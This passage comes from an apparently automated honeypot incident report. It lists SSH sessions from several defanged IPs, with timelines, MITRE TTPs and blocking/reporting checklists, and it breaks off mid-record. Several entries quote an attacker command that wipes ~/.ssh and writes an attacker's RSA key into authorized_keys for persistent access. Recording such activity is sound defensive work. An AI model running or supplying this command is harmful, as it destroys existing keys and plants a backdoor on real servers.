| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:38:11` | `cowrie.session.connect` |
| `2026-06-30 14:38:11` | `cowrie.client.version` |
| `2026-06-30 14:38:12` | `cowrie.client.kex` |
| `2026-06-30 14:38:12` | `cowrie.login.success` |
| `2026-06-30 14:38:13` | `cowrie.session.params` |
| `2026-06-30 14:38:13` | `cowrie.command.input` |
| `2026-06-30 14:38:13` | `cowrie.command.failed` |
| `2026-06-30 14:38:14` | `cowrie.log.closed` |
| `2026-06-30 14:38:15` | `cowrie.session.params` |
| `2026-06-30 14:38:15` | `cowrie.command.input` |
| `2026-06-30 14:38:15` | `cowrie.session.file_download` |
| `2026-06-30 14:38:15` | `cowrie.log.closed` |
| `2026-06-30 14:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.124[.]70` to AbuseIPDB if not already reported
- [ ] Block `223.123.124[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-638a1effb347

| Field | Detail |
|---|---|
| **Source IP** | `223.123.124[.]70` |
| **First Seen** | 2026-06-30 14:38 |
| **Last Seen** | 2026-06-30 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:38:15` | `cowrie.session.connect` |
| `2026-06-30 14:38:15` | `cowrie.client.version` |
| `2026-06-30 14:38:15` | `cowrie.client.kex` |
| `2026-06-30 14:38:16` | `cowrie.login.success` |
| `2026-06-30 14:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.124[.]70` to AbuseIPDB if not already reported
- [ ] Block `223.123.124[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20077fa5b7c4

| Field | Detail |
|---|---|
| **Source IP** | `223.123.124[.]70` |
| **First Seen** | 2026-06-30 14:38 |
| **Last Seen** | 2026-06-30 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:38:17` | `cowrie.session.connect` |
| `2026-06-30 14:38:17` | `cowrie.client.version` |
| `2026-06-30 14:38:17` | `cowrie.client.kex` |
| `2026-06-30 14:38:18` | `cowrie.login.success` |
| `2026-06-30 14:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.124[.]70` to AbuseIPDB if not already reported
- [ ] Block `223.123.124[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c57805ae61

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-06-30 14:41 |
| **Last Seen** | 2026-06-30 14:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:41:53` | `cowrie.session.connect` |
| `2026-06-30 14:41:53` | `cowrie.client.version` |
| `2026-06-30 14:41:53` | `cowrie.client.kex` |
| `2026-06-30 14:41:54` | `cowrie.login.success` |
| `2026-06-30 14:41:54` | `cowrie.session.params` |
| `2026-06-30 14:41:54` | `cowrie.command.input` |
| `2026-06-30 14:41:54` | `cowrie.command.failed` |
| `2026-06-30 14:41:54` | `cowrie.log.closed` |
| `2026-06-30 14:41:55` | `cowrie.session.params` |
| `2026-06-30 14:41:55` | `cowrie.command.input` |
| `2026-06-30 14:41:55` | `cowrie.session.file_download` |
| `2026-06-30 14:41:55` | `cowrie.log.closed` |
| `2026-06-30 14:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-986f2c1cdf0a

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-06-30 14:41 |
| **Last Seen** | 2026-06-30 14:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:41:55` | `cowrie.session.connect` |
| `2026-06-30 14:41:55` | `cowrie.client.version` |
| `2026-06-30 14:41:55` | `cowrie.client.kex` |
| `2026-06-30 14:41:55` | `cowrie.login.success` |
| `2026-06-30 14:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f371d1917db

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-06-30 14:41 |
| **Last Seen** | 2026-06-30 14:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:41:55` | `cowrie.session.connect` |
| `2026-06-30 14:41:55` | `cowrie.client.version` |
| `2026-06-30 14:41:55` | `cowrie.client.kex` |
| `2026-06-30 14:41:55` | `cowrie.login.success` |
| `2026-06-30 14:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02ce21521752

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]179` |
| **First Seen** | 2026-06-30 14:42 |
| **Last Seen** | 2026-06-30 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:42:09` | `cowrie.session.connect` |
| `2026-06-30 14:42:09` | `cowrie.client.version` |
| `2026-06-30 14:42:09` | `cowrie.client.kex` |
| `2026-06-30 14:42:09` | `cowrie.login.success` |
| `2026-06-30 14:42:10` | `cowrie.session.params` |
| `2026-06-30 14:42:10` | `cowrie.command.input` |
| `2026-06-30 14:42:10` | `cowrie.command.failed` |
| `2026-06-30 14:42:10` | `cowrie.log.closed` |
| `2026-06-30 14:42:10` | `cowrie.session.params` |
| `2026-06-30 14:42:10` | `cowrie.command.input` |
| `2026-06-30 14:42:10` | `cowrie.session.file_download` |
| `2026-06-30 14:42:10` | `cowrie.log.closed` |
| `2026-06-30 14:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]179` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f6e079e54a

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]179` |
| **First Seen** | 2026-06-30 14:42 |
| **Last Seen** | 2026-06-30 14:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:42:10` | `cowrie.session.connect` |
| `2026-06-30 14:42:10` | `cowrie.client.version` |
| `2026-06-30 14:42:10` | `cowrie.client.kex` |
| `2026-06-30 14:42:10` | `cowrie.login.success` |
| `2026-06-30 14:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]179` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee85e70b703

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]179` |
| **First Seen** | 2026-06-30 14:42 |
| **Last Seen** | 2026-06-30 14:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:42:10` | `cowrie.session.connect` |
| `2026-06-30 14:42:10` | `cowrie.client.version` |
| `2026-06-30 14:42:10` | `cowrie.client.kex` |
| `2026-06-30 14:42:11` | `cowrie.login.success` |
| `2026-06-30 14:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]179` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfe152f41897

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 14:43 |
| **Last Seen** | 2026-06-30 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:43:39` | `cowrie.session.connect` |
| `2026-06-30 14:43:39` | `cowrie.client.version` |
| `2026-06-30 14:43:39` | `cowrie.client.kex` |
| `2026-06-30 14:43:39` | `cowrie.login.success` |
| `2026-06-30 14:43:40` | `cowrie.session.params` |
| `2026-06-30 14:43:40` | `cowrie.command.input` |
| `2026-06-30 14:43:40` | `cowrie.log.closed` |
| `2026-06-30 14:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f582847fe8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 14:44 |
| **Last Seen** | 2026-06-30 14:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:44:45` | `cowrie.session.connect` |
| `2026-06-30 14:44:48` | `cowrie.client.version` |
| `2026-06-30 14:44:48` | `cowrie.client.kex` |
| `2026-06-30 14:44:53` | `cowrie.login.success` |
| `2026-06-30 14:44:57` | `cowrie.session.params` |
| `2026-06-30 14:44:57` | `cowrie.command.input` |
| `2026-06-30 14:44:58` | `cowrie.log.closed` |
| `2026-06-30 14:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70305a580845

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 14:47 |
| **Last Seen** | 2026-06-30 14:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:47:10` | `cowrie.session.connect` |
| `2026-06-30 14:47:11` | `cowrie.client.version` |
| `2026-06-30 14:47:11` | `cowrie.client.kex` |
| `2026-06-30 14:47:13` | `cowrie.login.success` |
| `2026-06-30 14:47:16` | `cowrie.session.params` |
| `2026-06-30 14:47:16` | `cowrie.command.input` |
| `2026-06-30 14:47:16` | `cowrie.log.closed` |
| `2026-06-30 14:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c365c87428f5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 14:56 |
| **Last Seen** | 2026-06-30 14:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 14:56:49` | `cowrie.session.connect` |
| `2026-06-30 14:56:51` | `cowrie.client.version` |
| `2026-06-30 14:56:51` | `cowrie.client.kex` |
| `2026-06-30 14:56:57` | `cowrie.login.success` |
| `2026-06-30 14:57:01` | `cowrie.session.params` |
| `2026-06-30 14:57:01` | `cowrie.command.input` |
| `2026-06-30 14:57:03` | `cowrie.log.closed` |
| `2026-06-30 14:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fed0212106

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 15:04 |
| **Last Seen** | 2026-06-30 15:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:04:03` | `cowrie.session.connect` |
| `2026-06-30 15:04:03` | `cowrie.client.version` |
| `2026-06-30 15:04:03` | `cowrie.client.kex` |
| `2026-06-30 15:04:06` | `cowrie.login.success` |
| `2026-06-30 15:04:08` | `cowrie.session.params` |
| `2026-06-30 15:04:08` | `cowrie.command.input` |
| `2026-06-30 15:04:08` | `cowrie.log.closed` |
| `2026-06-30 15:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8690560209f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 15:07 |
| **Last Seen** | 2026-06-30 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:07:45` | `cowrie.session.connect` |
| `2026-06-30 15:07:45` | `cowrie.client.version` |
| `2026-06-30 15:07:45` | `cowrie.client.kex` |
| `2026-06-30 15:07:45` | `cowrie.login.success` |
| `2026-06-30 15:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ceb87f33b55

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 15:07 |
| **Last Seen** | 2026-06-30 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:07:45` | `cowrie.session.connect` |
| `2026-06-30 15:07:45` | `cowrie.client.version` |
| `2026-06-30 15:07:45` | `cowrie.client.kex` |
| `2026-06-30 15:07:45` | `cowrie.login.success` |
| `2026-06-30 15:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c7a58d6574

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 15:07 |
| **Last Seen** | 2026-06-30 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:07:50` | `cowrie.session.connect` |
| `2026-06-30 15:07:50` | `cowrie.client.version` |
| `2026-06-30 15:07:50` | `cowrie.client.kex` |
| `2026-06-30 15:07:50` | `cowrie.login.success` |
| `2026-06-30 15:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0acb1a469d1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 15:07 |
| **Last Seen** | 2026-06-30 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:07:50` | `cowrie.session.connect` |
| `2026-06-30 15:07:50` | `cowrie.client.version` |
| `2026-06-30 15:07:50` | `cowrie.client.kex` |
| `2026-06-30 15:07:50` | `cowrie.login.success` |
| `2026-06-30 15:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb8e4b93eb10

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 15:09 |
| **Last Seen** | 2026-06-30 15:09 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:09:17` | `cowrie.session.connect` |
| `2026-06-30 15:09:18` | `cowrie.client.version` |
| `2026-06-30 15:09:18` | `cowrie.client.kex` |
| `2026-06-30 15:09:24` | `cowrie.login.success` |
| `2026-06-30 15:09:28` | `cowrie.session.params` |
| `2026-06-30 15:09:28` | `cowrie.command.input` |
| `2026-06-30 15:09:29` | `cowrie.log.closed` |
| `2026-06-30 15:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa005cd9a83

| Field | Detail |
|---|---|
| **Source IP** | `203.130.11[.]3` |
| **First Seen** | 2026-06-30 15:10 |
| **Last Seen** | 2026-06-30 15:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:10:19` | `cowrie.session.connect` |
| `2026-06-30 15:10:19` | `cowrie.client.version` |
| `2026-06-30 15:10:19` | `cowrie.client.kex` |
| `2026-06-30 15:10:20` | `cowrie.login.success` |
| `2026-06-30 15:10:21` | `cowrie.session.params` |
| `2026-06-30 15:10:21` | `cowrie.command.input` |
| `2026-06-30 15:10:21` | `cowrie.command.failed` |
| `2026-06-30 15:10:21` | `cowrie.log.closed` |
| `2026-06-30 15:10:22` | `cowrie.session.params` |
| `2026-06-30 15:10:22` | `cowrie.command.input` |
| `2026-06-30 15:10:22` | `cowrie.session.file_download` |
| `2026-06-30 15:10:22` | `cowrie.log.closed` |
| `2026-06-30 15:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.130.11[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.130.11[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdef278edfb0

| Field | Detail |
|---|---|
| **Source IP** | `203.130.11[.]3` |
| **First Seen** | 2026-06-30 15:10 |
| **Last Seen** | 2026-06-30 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:10:22` | `cowrie.session.connect` |
| `2026-06-30 15:10:22` | `cowrie.client.version` |
| `2026-06-30 15:10:23` | `cowrie.client.kex` |
| `2026-06-30 15:10:23` | `cowrie.login.success` |
| `2026-06-30 15:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.130.11[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.130.11[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-776047282c58

| Field | Detail |
|---|---|
| **Source IP** | `203.130.11[.]3` |
| **First Seen** | 2026-06-30 15:10 |
| **Last Seen** | 2026-06-30 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:10:24` | `cowrie.session.connect` |
| `2026-06-30 15:10:24` | `cowrie.client.version` |
| `2026-06-30 15:10:24` | `cowrie.client.kex` |
| `2026-06-30 15:10:25` | `cowrie.login.success` |
| `2026-06-30 15:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.130.11[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.130.11[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4d78e725e57

| Field | Detail |
|---|---|
| **Source IP** | `36.93.144[.]67` |
| **First Seen** | 2026-06-30 15:17 |
| **Last Seen** | 2026-06-30 15:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:17:05` | `cowrie.session.connect` |
| `2026-06-30 15:17:05` | `cowrie.client.version` |
| `2026-06-30 15:17:05` | `cowrie.client.kex` |
| `2026-06-30 15:17:06` | `cowrie.login.success` |
| `2026-06-30 15:17:07` | `cowrie.session.params` |
| `2026-06-30 15:17:07` | `cowrie.command.input` |
| `2026-06-30 15:17:07` | `cowrie.command.failed` |
| `2026-06-30 15:17:08` | `cowrie.log.closed` |
| `2026-06-30 15:17:08` | `cowrie.session.params` |
| `2026-06-30 15:17:08` | `cowrie.command.input` |
| `2026-06-30 15:17:09` | `cowrie.session.file_download` |
| `2026-06-30 15:17:09` | `cowrie.log.closed` |
| `2026-06-30 15:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.144[.]67` to AbuseIPDB if not already reported
- [ ] Block `36.93.144[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f215b4e08c3a

| Field | Detail |
|---|---|
| **Source IP** | `36.93.144[.]67` |
| **First Seen** | 2026-06-30 15:17 |
| **Last Seen** | 2026-06-30 15:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 15:17:09` | `cowrie.session.connect` |
